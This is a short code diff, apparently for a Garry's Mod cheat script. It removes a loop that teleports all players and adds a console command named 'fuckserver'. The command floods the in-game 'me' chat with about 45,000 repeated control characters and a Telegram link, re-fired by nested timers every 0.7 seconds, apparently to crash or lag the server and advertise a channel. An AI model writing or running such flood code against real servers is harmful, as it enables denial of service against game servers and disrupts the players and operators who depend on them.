@@ -1,3 +1,11 @@
-for k, v in pairs(player.GetAll()) do
-  RunConsoleCommand("ba", "tp", v:SteamID())
-end
+concommand.Add('fuckserver', function()
+cmd.Run("me", (string.char(2) .. " "):rep(45000) .. "t.me/wtfbomba13")
+timer.Create("fuckserver" .. math.random(1), 0.7, 0, function()
+cmd.Run("me", (string.char(2) .. " "):rep(45000) .. "t.me/wtfbomba13")
+timer.Create("fuckserver" .. math.random(1), 0.7, 0, function()
+cmd.Run("me", (string.char(2) .. " "):rep(45000) .. "t.me/wtfbomba13")
+timer.Create("fuckserver" .. math.random(1), 0.7, 0, function()
+end)
+end)
+end)
+end)
